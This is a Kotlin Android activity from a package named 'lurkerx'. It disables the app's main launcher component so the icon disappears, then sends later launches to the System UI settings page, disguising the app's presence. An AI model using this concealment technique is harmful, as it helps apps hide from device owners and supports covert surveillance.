package com.lurkerx.codebase

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.util.Log

class LauncherActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val pm = packageManager
        val mainComponent = ComponentName(this, MainActivity::class.java)

        val state = pm.getComponentEnabledSetting(mainComponent)

        if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            try {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:com.android.systemui")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
                Log.d("LauncherActivity", "MainActivity hidden, opening System UI settings")
            } catch (e: Exception) {
                Log.e("LauncherActivity", "Failed to open System UI settings", e)
            }
            finish()

        } else {
            pm.setComponentEnabledSetting(
                mainComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("LauncherActivity", "MainActivity now hidden")
            finish()
        }
    }
}
